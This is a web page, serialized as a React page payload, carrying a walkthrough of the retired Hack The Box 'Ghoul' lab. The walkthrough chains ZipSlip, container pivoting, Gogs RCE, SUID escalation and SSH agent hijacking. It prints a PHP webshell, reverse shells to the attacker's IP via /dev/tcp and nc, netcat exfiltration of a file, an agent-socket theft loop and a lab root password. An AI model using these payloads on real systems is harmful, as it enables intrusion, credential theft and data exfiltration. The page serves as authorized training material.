@@ -1,0 +1,408 @@
+1:"$Sreact.fragment"
+2:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+3:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+f:I[6025,[],"OutletBoundary"]
+10:"$Sreact.suspense"
+:HL["/writing/covers/hackthebox-ghoul-walkthrough.webp","image"]
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","children":"Research"}],["$","a","/services",{"href":"/services","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","children":"Projects"}],["$","a","/about",{"href":"/about","children":"About"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Ghoul Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Ghoul machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T13:12:45.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[13," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-ghoul-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Ghoul machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Ghoul machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/ghoul","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/a419ee77d26c4d6599604de57f568424cdc7a8db/HTB-Ghoul.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · a419ee77d26c",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Ghoul",""," · Hard"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/ghoul","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L4"]}]]}],["$L5","$L6","$L7"]]}],"$L8"]}]]}],"$L9"]}],"$La","$Lb"],null,"$Lc"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"65jXSdzueZKnFbMeYrtpi"}
+4:["$","span",null,{"aria-hidden":"true","children":"↗"}]
+5:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Ghoul machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+6:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+7:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"4 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+d:T6075,
+<p><strong>Target:</strong> <code>10.129.10.52</code><br /><strong>Attacker:</strong> <code>10.10.16.84</code> (Kali)<br /><strong>Difficulty:</strong> Hard<br /><strong>Key Concepts:</strong> ZipSlip, Container Pivoting, SSH Key Cracking, Git Forensics, SSH Agent Hijacking, Gogs RCE</p>
+<hr />
+
+
+
+<h2 id="the-big-picture-what-are-we-facing">The Big Picture: What Are We Facing?</h2>
+<p><strong>Hacker Mindset:</strong> Before touching anything, understand the architecture. Ghoul isn't a single machine — it's a <strong>nested Docker environment</strong>. This means:</p>
+<ul>
+<li>The IP <code>10.129.10.52</code> is the <strong>Docker host</strong> (the physical/virtual machine running the box)</li>
+<li>Inside it are multiple containers: <strong>Aogiri</strong> (web), <strong>kaneki-pc</strong> (intermediate), <strong>Gogs</strong> (git server)</li>
+<li>There is NO user.txt or root.txt on the first container we pop. The flags live deeper.</li>
+</ul>
+<p><strong>Why this matters:</strong> You cannot treat this like a normal box. Every shell you get is just a stepping stone. Your goal isn't just to "get root" — it's to <strong>traverse the network</strong> and find where the data actually lives.</p>
+<hr />
+<h2 id="phase-1-reconnaissance-mapping-the-battlefield">Phase 1: Reconnaissance — Mapping the Battlefield</h2>
+<h3 id="the-command">The Command</h3>
+<pre><code class="language-bash" data-language="bash">nmap -sT -p- --min-rate 10000 10.129.10.52
+</code></pre>
+<p><strong>Hacker Mindset:</strong> Why <code>--min-rate 10000</code>? Because HTB boxes are often behind a VPN with decent bandwidth. We want speed. We also use <code>-sT</code> (TCP connect) because it doesn't require root privileges for SYN scans and is reliable over VPNs.</p>
+<h3 id="results">Results</h3>
+<pre><code>PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+2222/tcp open  ssh
+8080/tcp open  http-proxy
+</code></pre>
+<p><strong>Critical Observations:</strong></p>
+<ol>
+<li><strong>Two SSH ports (22 and 2222)</strong> — This is a HUGE red flag. Normal boxes don't run two SSH daemons unless they're forwarding into different containers. The versions are even different (<code>4ubuntu0.1</code> vs <code>4ubuntu0.2</code>).</li>
+<li><strong>Two HTTP ports (80 and 8080)</strong> — Port 80 is Apache. Port 8080 is Tomcat. Two web servers usually means two different applications, possibly in different containers.</li>
+</ol>
+<p><strong>Conclusion:</strong> We're definitely dealing with Docker containers. Port 80/22 likely go to Container A. Port 8080 might be another service on Container A, or a gateway to something else. We enumerate both.</p>
+<h3 id="version-scan">Version Scan</h3>
+<pre><code class="language-bash" data-language="bash">nmap -sC -sV -p 22,80,2222,8080 10.129.10.52
+</code></pre>
+<p><strong>Key findings:</strong></p>
+<ul>
+<li>Port 80: <code>Apache httpd 2.4.29</code>, title: "Aogiri Tree"</li>
+<li>Port 8080: <code>Apache Tomcat/7.0.88</code>, HTTP Basic Auth realm="Aogiri"</li>
+</ul>
+<p><strong>Hacker Mindset:</strong> The shared realm name "Aogiri" tells us these services are related. They're probably part of the same application ecosystem. Tomcat on 8080 with Basic Auth means there's likely an admin panel or upload functionality.</p>
+<hr />
+<h2 id="phase-2-the-tomcat-upload-zipslip">Phase 2: The Tomcat Upload (ZipSlip)</h2>
+<h3 id="web-enumeration-on-port-80">Web Enumeration on Port 80</h3>
+<p>Browsing to <code>http://10.129.10.52</code> reveals a Tokyo Ghoul-themed website. Key findings:</p>
+<ul>
+<li><code>/secret.php</code> — Contains a simulated chat log. In the chat, we see: <code>ILoveTouka</code> (a potential password), mentions of a "fake art site" for uploads, and hints about RCE.</li>
+<li><code>/users/login.php</code> — A login portal. We could brute force this, but it's a rabbit hole (hardcoded weak creds exist but lead to nothing useful).</li>
+</ul>
+<p><strong>Hacker Mindset:</strong> Always read the source material. The chat log isn't just flavor text — it's <strong>intelligence</strong>. <code>ILoveTouka</code> is a password we'll need later. The "fake art site" is pointing us to port 8080.</p>
+<h3 id="port-8080-the-tomcat-app">Port 8080: The Tomcat App</h3>
+<p>Accessing <code>http://10.129.10.52:8080</code> prompts for HTTP Basic Auth.</p>
+<p><strong>Hacker Mindset:</strong> Before firing up Hydra or Burp, try the stupid stuff. <code>admin:admin</code> works.</p>
+<p>The Tomcat app is an image upload gallery. There are three upload panels:</p>
+<ol>
+<li>Image upload (JPEG only, signature checked)</li>
+<li>Text upload</li>
+<li><strong>ZIP upload</strong> — This is our target.</li>
+</ol>
+<h3 id="the-vulnerability-zipslip">The Vulnerability: ZipSlip</h3>
+<p>When you upload a ZIP file, the Java backend extracts it. The vulnerability is that it <strong>does not sanitize path traversal sequences</strong> (<code>../../..</code>) inside the ZIP entries.</p>
+<p><strong>Why this works:</strong> ZIP files store relative paths. If you craft a ZIP containing a file named <code>../../../../../../var/www/html/shell.php</code>, the Java extractor will write that file to the absolute path <code>/var/www/html/shell.php</code> — <strong>as the user running Tomcat</strong>.</p>
+<p><strong>Hacker Mindset:</strong> Checking running processes with <code>ps aux</code> later reveals Tomcat runs as <strong>root</strong>. This is an unintended (but game-breaking) configuration. It means our ZipSlip gives us <strong>arbitrary file write as root</strong>.</p>
+<h3 id="exploitation-steps">Exploitation Steps</h3>
+<p><strong>1. Create a PHP webshell:</strong></p>
+<pre><code class="language-bash" data-language="bash">echo '&lt;?php system($_REQUEST["cmd"]); ?&gt;' &gt; /tmp/shell.php
+</code></pre>
+<p><strong>2. Create the malicious ZIP:</strong></p>
+<pre><code class="language-python" data-language="python">import zipfile
+with zipfile.ZipFile("/tmp/shell.zip", "w") as z:
+    z.write("/tmp/shell.php", "../../../../../../var/www/html/shell.php")
+</code></pre>
+<p><strong>3. Verify:</strong></p>
+<pre><code class="language-bash" data-language="bash">unzip -l /tmp/shell.zip
+# Should show: ../../../../../../var/www/html/shell.php
+</code></pre>
+<p><strong>4. Upload:</strong></p>
+<pre><code class="language-bash" data-language="bash">curl -u REDACTED -F 'data=@/tmp/shell.zip' http://10.129.10.52:8080/upload
+</code></pre>
+<p><strong>5. Trigger reverse shell:</strong></p>
+<pre><code class="language-bash" data-language="bash"># On Kali
+nc -lvnp 443
+
+# Trigger
+curl http://10.129.10.52/shell.php --data-urlencode "cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1'"
+</code></pre>
+<p><strong>Result:</strong> We get a shell as <code>www-data</code> on the Aogiri container.</p>
+<hr />
+<h2 id="phase-3-post-exploitation-on-aogiri-container-1">Phase 3: Post-Exploitation on Aogiri (Container 1)</h2>
+<h3 id="confirming-we-re-in-a-container">Confirming We're in a Container</h3>
+<pre><code class="language-bash" data-language="bash">ls -la /
+# .dockerenv exists
+
+grep -i docker /proc/self/cgroup
+# Multiple docker:/ paths
+</code></pre>
+<p><strong>Hacker Mindset:</strong> <code>.dockerenv</code> and cgroup paths confirm containerization. This means:</p>
+<ul>
+<li>The "real" machine is the Docker host</li>
+<li>There are likely other containers on internal networks</li>
+<li>We need to find internal IPs and pivot</li>
+</ul>
+<h3 id="finding-ssh-keys">Finding SSH Keys</h3>
+<pre><code class="language-bash" data-language="bash">ls /var/backups/backups/keys/
+# eto.backup  kaneki.backup  noro.backup
+</code></pre>
+<p>All three are RSA private keys. <code>eto.backup</code> and <code>noro.backup</code> are unencrypted. <code>kaneki.backup</code> is <strong>encrypted</strong>.</p>
+<p><strong>Hacker Mindset:</strong> Why check <code>/var/backups</code>? Because admins back up sensitive data and sometimes forget to secure it. Keys in backups are a goldmine. The fact that one is encrypted means it's probably more valuable — people only encrypt what they care about.</p>
+<h3 id="cracking-kaneki-s-key">Cracking kaneki's Key</h3>
+<p>The passphrase is <code>ILoveTouka</code> — found in the <code>/secret.php</code> chat screenshot.</p>
+<p><strong>On Kali:</strong></p>
+<pre><code class="language-bash" data-language="bash">chmod 600 kaneki.backup
+ssh -i kaneki.backup kaneki@10.129.10.52
+# Passphrase: ILoveTouka
+</code></pre>
+<p><strong>Why SSH back into the same IP?</strong> Because <code>10.129.10.52:22</code> forwards to the Aogiri container. Logging in as <code>kaneki</code> gives us a proper user shell with a home directory and better privileges than <code>www-data</code>.</p>
+<h3 id="inside-home-kaneki">Inside /home/kaneki</h3>
+<pre><code class="language-bash" data-language="bash">cat note.txt
+# Vulnerability in Gogs was detected. I shutdown the registration function on our server...
+
+cat notes
+# I've set up file server into the server's network ,Eto if you need to transfer files to the server can use my pc.
+
+cat user.txt
+# [USER FLAG - we'll grab this later or from the host]
+</code></pre>
+<p><strong>Hacker Mindset:</strong> These notes are breadcrumbs. They tell us:</p>
+<ol>
+<li>There's a <strong>Gogs</strong> server somewhere</li>
+<li>There's a <strong>"server's network"</strong> — another subnet</li>
+<li>"kaneki's pc" is a thing — probably another container</li>
+</ol>
+<hr />
+<h2 id="phase-4-pivot-to-kaneki-pc-container-2">Phase 4: Pivot to kaneki-pc (Container 2)</h2>
+<h3 id="discovering-kaneki-pc">Discovering kaneki-pc</h3>
+<p>In <code>/home/kaneki/.ssh/authorized_keys</code>, we see:</p>
+<pre><code>ssh-rsa ... kaneki_pub@kaneki-pc
+ssh-rsa ... kaneki@Aogiri
+</code></pre>
+<p><strong>Hacker Mindset:</strong> The <code>authorized_keys</code> file tells us two things:</p>
+<ol>
+<li>A key for <code>kaneki_pub@kaneki-pc</code> is trusted. This means there's a machine called <code>kaneki-pc</code> and a user <code>kaneki_pub</code>.</li>
+<li>The same private key (<code>kaneki.backup</code>) likely works for both identities.</li>
+</ol>
+<h3 id="internal-network-scan">Internal Network Scan</h3>
+<pre><code class="language-bash" data-language="bash">for i in {1..254}; do (ping -c 1 172.20.0.${i} | grep "bytes from" | grep -v "Unreachable" &amp;); done;
+</code></pre>
+<p>Results:</p>
+<ul>
+<li><code>172.20.0.1</code> — Docker gateway</li>
+<li><code>172.20.0.10</code> — Ourselves (Aogiri)</li>
+<li><code>172.20.0.150</code> — <strong>kaneki-pc</strong></li>
+</ul>
+<p><strong>Hacker Mindset:</strong> We use <code>ping</code> instead of <code>nmap</code> because <code>nmap</code> might not be installed in the container. Bash loops with <code>ping</code> are universally available. Always adapt to your environment.</p>
+<h3 id="pivoting-via-ssh">Pivoting via SSH</h3>
+<pre><code class="language-bash" data-language="bash">ssh -i /home/kaneki/.ssh/id_rsa kaneki_pub@172.20.0.150
+# Passphrase: ILoveTouka
+</code></pre>
+<p><strong>Result:</strong> <code>kaneki_pub@kaneki-pc</code></p>
+<p><strong>Hacker Mindset:</strong> This is <strong>lateral movement</strong>. We're using legitimate credentials (stolen keys) to move between systems. This is quieter than exploiting new vulnerabilities. Always prefer "living off the land" when possible.</p>
+<hr />
+<h2 id="phase-5-discovering-and-tunneling-to-gogs-container-3">Phase 5: Discovering and Tunneling to Gogs (Container 3)</h2>
+<h3 id="network-enumeration-on-kaneki-pc">Network Enumeration on kaneki-pc</h3>
+<pre><code class="language-bash" data-language="bash">ifconfig
+</code></pre>
+<p>Shows <code>eth1</code> with <code>172.18.0.200</code>. New subnet!</p>
+<pre><code class="language-bash" data-language="bash">for i in {1..254}; do (ping -c 1 172.18.0.${i} | grep "bytes from" | grep -v "Unreachable" &amp;); done;
+</code></pre>
+<p>Results:</p>
+<ul>
+<li><code>172.18.0.1</code> — Docker gateway (the actual host!)</li>
+<li><code>172.18.0.2</code> — Another container</li>
+<li><code>172.18.0.200</code> — Ourselves</li>
+</ul>
+<p>Port check on <code>172.18.0.2</code>:</p>
+<pre><code class="language-bash" data-language="bash">bash -c 'exec 3&lt;&gt;/dev/tcp/172.18.0.2/3000 &amp;&amp; echo "open"'
+# open
+</code></pre>
+<p><strong>Hacker Mindset:</strong> We can't run <code>nmap</code>, so we use bash's built-in <code>/dev/tcp</code> feature. This is a classic container trick. Every bash shell is a port scanner if you know how to use it.</p>
+<h3 id="setting-up-double-ssh-tunnels">Setting Up Double SSH Tunnels</h3>
+<p>Kali can't reach <code>172.18.0.2</code> directly. We need to tunnel through Aogiri, then through kaneki-pc.</p>
+<p><strong>Tunnel 1 (Kali → Aogiri → kaneki-pc SSH):</strong></p>
+<pre><code class="language-bash" data-language="bash">ssh -L 2222:172.20.0.150:22 -N -i ~/kaneki.backup kaneki@10.129.10.52
+</code></pre>
+<p><strong>Tunnel 2 (Kali → kaneki-pc → Gogs):</strong></p>
+<pre><code class="language-bash" data-language="bash">ssh -p 2222 -L 3000:172.18.0.2:3000 -N -i ~/kaneki.backup kaneki_pub@127.0.0.1
+</code></pre>
+<p><strong>Hacker Mindset:</strong> This is <strong>tunnel chaining</strong>. Think of SSH tunnels as pipes. The first pipe connects Kali's port 2222 to kaneki-pc's port 22. The second pipe connects Kali's port 3000 to Gogs' port 3000, but travels through the first pipe. This is how you access internal networks without ever being "on" them.</p>
+<p><strong>Result:</strong> Browse to <code>http://127.0.0.1:3000</code> on Kali → Gogs login page.</p>
+<hr />
+<h2 id="phase-6-exploiting-gogs-for-rce">Phase 6: Exploiting Gogs for RCE</h2>
+<h3 id="gogs-background">Gogs Background</h3>
+<p>Gogs is a self-hosted Git service (like GitHub Enterprise). Version <strong>0.11.66</strong> has two critical CVEs:</p>
+<ul>
+<li><strong>CVE-2018-18925:</strong> Pre-auth path traversal in file uploads (session hijacking)</li>
+<li><strong>CVE-2018-20303:</strong> Authenticated path traversal to write session files</li>
+</ul>
+<p>Combined, these allow an attacker to forge an <strong>admin session cookie</strong> and then use Git hooks for RCE.</p>
+<h3 id="authentication">Authentication</h3>
+<p>Credentials from <code>/usr/share/tomcat7/conf/tomcat-users.xml</code> on Aogiri:</p>
+<ul>
+<li><code>aogiritest:test@aogiri123</code></li>
+</ul>
+<p><strong>Hacker Mindset:</strong> Password reuse is real. Admins reuse passwords across services. Always collect every credential you find and try them everywhere.</p>
+<h3 id="using-gogsownz">Using gogsownz</h3>
+<p>We use the <a href="https://github.com/TheZ3ro/gogsownz" target="_blank" rel="nofollow noopener noreferrer">gogsownz</a> tool, with some patches for Python 3 compatibility and case-sensitivity issues.</p>
+<p><strong>The patched script:</strong></p>
+<pre><code class="language-python" data-language="python"># Changes applied:
+# 1. iterkeys() -&gt; keys() (Python 3)
+# 2. len(cookies) != 1 -&gt; len(cookies) &lt; 1 (handle multiple cookies)
+# 3. Username checks made case-insensitive
+</code></pre>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">python3 gogsownz.py http://127.0.0.1:3000/ -n i_like_gogits -C "aogiritest:test@aogiri123" -v --rce "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.84 4444 &gt;/tmp/f" --cleanup
+</code></pre>
+<p><strong>What happens under the hood:</strong></p>
+<ol>
+<li>Logs in as <code>aogiritest</code></li>
+<li>Creates a repository</li>
+<li>Uploads a forged admin session file via path traversal</li>
+<li>Commits the file (writing it to the session store)</li>
+<li>Swaps to the admin session (now logged in as <code>kaneki</code>, who is admin)</li>
+<li>Creates another repo, sets a Git <code>post-receive</code> hook containing our reverse shell</li>
+<li>Triggers the hook by making a new commit</li>
+<li>Cleans up the repo evidence</li>
+</ol>
+<p><strong>Result:</strong> Shell as <code>git</code> user on the Gogs container.</p>
+<hr />
+<h2 id="phase-7-privilege-escalation-on-gogs-gosu">Phase 7: Privilege Escalation on Gogs (gosu)</h2>
+<h3 id="finding-gosu">Finding gosu</h3>
+<pre><code class="language-bash" data-language="bash">find / -perm /4000 2&gt;/dev/null
+# /usr/sbin/gosu
+</code></pre>
+<p><code>gosu</code> is a SUID binary that runs commands as other users. It's like <code>sudo</code> but without configuration files.</p>
+<p><strong>Why is this here?</strong> In Docker containers, <code>gosu</code> is commonly used to drop from root to a non-root user when starting services. The developers accidentally left it SUID.</p>
+<h3 id="exploitation">Exploitation</h3>
+<pre><code class="language-bash" data-language="bash">gosu root /bin/sh
+id
+# uid=0(root) gid=0(root)
+</code></pre>
+<p><strong>Hacker Mindset:</strong> SUID binaries are privilege escalation vectors. When you find one, immediately ask: "What does this binary do, and can I abuse it?" <code>gosu</code> is literally designed to run commands as other users. Running <code>gosu root /bin/sh</code> is trivial.</p>
+<hr />
+<h2 id="phase-8-git-forensics-finding-the-hidden-password">Phase 8: Git Forensics — Finding the Hidden Password</h2>
+<h3 id="the-files-in-root">The Files in /root</h3>
+<pre><code class="language-bash" data-language="bash">cd /root
+ls
+# aogiri-app.7z  session.sh
+</code></pre>
+<ul>
+<li><code>session.sh</code> — A cron script that logs into Gogs as <code>kaneki:12345ILoveTouka!!!</code> every 10 minutes. This is a credential, but not the one we need.</li>
+<li><code>aogiri-app.7z</code> — A 7zip archive containing a Java application with a <strong><code>.git</code> directory</strong>.</li>
+</ul>
+<h3 id="exfiltration-to-kali">Exfiltration to Kali</h3>
+<pre><code class="language-bash" data-language="bash"># On Kali
+nc -lvnp 5555 &gt; aogiri-app.7z
+
+# On Gogs root shell
+nc -w 3 10.10.16.84 5555 &lt; /root/aogiri-app.7z
+</code></pre>
+<h3 id="git-forensics">Git Forensics</h3>
+<pre><code class="language-bash" data-language="bash">7z x aogiri-app.7z
+cd aogiri-chatapp
+git log --oneline
+</code></pre>
+<p>Output shows normal commits. But there's a hidden secret:</p>
+<pre><code class="language-bash" data-language="bash">git show ORIG_HEAD
+</code></pre>
+<p><code>ORIG_HEAD</code> points to a commit made <strong>before a <code>git reset --hard</code></strong>. It contains:</p>
+<pre><code class="language-diff" data-language="diff">-spring.datasource.username=kaneki
+-spring.datasource.password=REDACTED
++spring.datasource.username=root
++spring.datasource.password=REDACTED
+</code></pre>
+<p><strong>Hacker Mindset:</strong> Git is a time machine. Even if developers "delete" secrets with new commits, the old data often lives in:</p>
+<ul>
+<li><code>ORIG_HEAD</code></li>
+<li><code>git reflog</code></li>
+<li>The <code>.git/objects</code> directory</li>
+</ul>
+<p>Always check <code>git reflog</code> and <code>git log --all</code> when you find a repo. Developers panic-delete credentials but forget that Git remembers everything.</p>
+<p><strong>The password <code>7^Grc%C\7xEQ?tb4</code> is the root password for kaneki-pc.</strong></p>
+<hr />
+<h2 id="phase-9-root-on-kaneki-pc">Phase 9: Root on kaneki-pc</h2>
+<p>Go back to your <code>kaneki_pub@kaneki-pc</code> shell:</p>
+<pre><code class="language-bash" data-language="bash">su -
+Password: null
+id
+# uid=0(root) gid=0(root)
+</code></pre>
+<p><strong>Note:</strong> <code>/root/root.txt</code> on kaneki-pc is a <strong>troll</strong>:</p>
+<pre><code>You've done well to come upto here human. But what you seek doesn't lie here. The journey isn't over yet.....
+</code></pre>
+<p><strong>Hacker Mindset:</strong> HTB loves troll flags. Always verify what you find. The real root flag is on the <strong>host</strong>, not in this container.</p>
+<hr />
+<h2 id="phase-10-ssh-agent-hijacking-the-final-leap">Phase 10: SSH Agent Hijacking — The Final Leap</h2>
+<h3 id="the-vulnerability">The Vulnerability</h3>
+<p>On kaneki-pc, a cronjob runs every 6 minutes as user <code>kaneki_adm</code>:</p>
+<pre><code class="language-bash" data-language="bash">ssh-agent -s | head -n 1 &gt; /home/kaneki/agent.cf
+source /home/kaneki/agent.cf
+ssh-add
+ssh -tt -A kaneki_adm@172.20.0.150 ssh root@172.18.0.1 -p 2222 -t './log.sh'
+</code></pre>
+<p><strong>What is SSH Agent Forwarding?</strong>
+Normally, SSH authenticates using a private key on your local machine. With Agent Forwarding (<code>-A</code>), your local machine keeps the private key in memory and exposes a <strong>Unix socket</strong> (<code>SSH_AUTH_SOCK</code>) on the remote machine. The remote machine can then use that socket to authenticate to OTHER machines on your behalf, without ever seeing your private key.</p>
+<p><strong>Why this is dangerous:</strong> If you compromise the intermediate machine (kaneki-pc), you can access that socket and impersonate the original user.</p>
+<h3 id="the-hijack">The Hijack</h3>
+<p>We wait for <code>kaneki_adm</code> to connect, steal their socket, and SSH as root to the host.</p>
+<pre><code class="language-bash" data-language="bash">while true; do
+  export pid=$(ps -u kaneki_adm | grep ssh$ | tr -s ' ' | cut -d' ' -f2);
+  if [ ! -z "$pid" ]; then
+    export SSH_AUTH_SOCK=$(su kaneki_adm -c "cat /proc/${pid}/environ" | tr '\0' '\n' | grep SSH_AUTH_SOCK | cut -d'=' -f2);
+    SSH_AUTH_SOCK="$SSH_AUTH_SOCK" ssh root@172.18.0.1 -p 2222;
+    break;
+  fi;
+  sleep 5;
+done
+</code></pre>
+<p><strong>What this does:</strong></p>
+<ol>
+<li>Polls for <code>kaneki_adm</code> SSH processes</li>
+<li>When found, reads <code>/proc/[pid]/environ</code> (process environment variables) to extract <code>SSH_AUTH_SOCK</code></li>
+<li>Sets that socket in our environment</li>
+<li>SSHes to <code>172.18.0.1:2222</code> (the Docker host) as <code>root</code></li>
+<li>The host sees our connection as authenticated by the forwarded agent — <strong>no password needed</strong></li>
+</ol>
+<p><strong>Result:</strong> <code>root@ghoul</code> — the actual host machine.</p>
+<hr />
+<h2 id="flags">Flags</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Location</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>user.txt</strong></td>
+<td><code>/home/kaneki/user.txt</code> (on Aogiri container, accessible from host)</td>
+<td><code>3085394b[redacted]98e0248</code></td>
+</tr>
+<tr>
+<td><strong>root.txt</strong></td>
+<td><code>/root/root.txt</code> (on the host)</td>
+<td><code>ee1d9278[redacted]df7d25d</code></td>
+</tr>
+</tbody></table>
+<hr />
+<h2 id="key-takeaways-and-hacker-mindset">Key Takeaways &amp; Hacker Mindset</h2>
+<h3 id="1-think-in-networks-not-single-hosts">1. Think in Networks, Not Single Hosts</h3>
+<p>Ghoul is a masterclass in <strong>pivoting</strong>. Every shell is just a hop. Your mental model should be:</p>
+<blockquote>
+<p>"I am here. What can I see from here? What credentials do I have? Where can I go next?"</p>
+</blockquote>
+<h3 id="2-read-everything">2. Read Everything</h3>
+<ul>
+<li><code>secret.php</code> gave us <code>ILoveTouka</code></li>
+<li><code>tomcat-users.xml</code> gave us <code>test@aogiri123</code></li>
+<li><code>.git/ORIG_HEAD</code> gave us the root password</li>
+<li>Notes and to-do files told us about other containers</li>
+</ul>
+<p><strong>Hacker Mindset:</strong> The developers left breadcrumbs everywhere. Your job is to be a detective.</p>
+<h3 id="3-adapt-your-tools-to-the-environment">3. Adapt Your Tools to the Environment</h3>
+<p>When <code>nmap</code> and <code>nc</code> aren't available in containers, use:</p>
+<ul>
+<li>Bash loops with <code>ping</code> for host discovery</li>
+<li><code>/dev/tcp/host/port</code> for port scanning</li>
+<li><code>base64</code> + copy-paste for file transfers</li>
+<li>Python for creating malicious ZIPs</li>
+</ul>
+<h3 id="4-git-is-a-goldmine">4. Git is a Goldmine</h3>
+<p>Whenever you find a <code>.git</code> directory:</p>
+<ul>
+<li><code>git log --all</code></li>
+<li><code>git reflog</code></li>
+<li><code>git show ORIG_HEAD</code></li>
+<li><code>git diff HEAD~5</code></li>
+</ul>
+<p>Developers commit secrets, panic-reset, and forget Git remembers.</p>
+<h3 id="5-abuse-legitimate-features">5. Abuse Legitimate Features</h3>
+<ul>
+<li><strong>ZipSlip</strong> abused Java's legitimate ZIP extraction</li>
+<li><strong>SSH Agent Forwarding</strong> abused a legitimate convenience feature</li>
+<li><strong>gosu</strong> abused a legitimate container administration tool</li>
+</ul>
+<p><strong>Hacker Mindset:</strong> You don't always need a CVE. Sometimes the "vulnerability" is just a feature used in an unexpected way.</p>
+<h3 id="6-be-patient">6. Be Patient</h3>
+<p>The SSH agent hijack required waiting up to 6 minutes. In real-world pentesting, persistence and patience separate good hackers from great ones.</p>
+<hr />
+<p><strong>Machine Pwned.</strong> </p>
+8:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$d"}}]
+9:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-forgot-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: Forgot Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-hackback-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: Hackback Walkthrough"}]]}]}]]}]
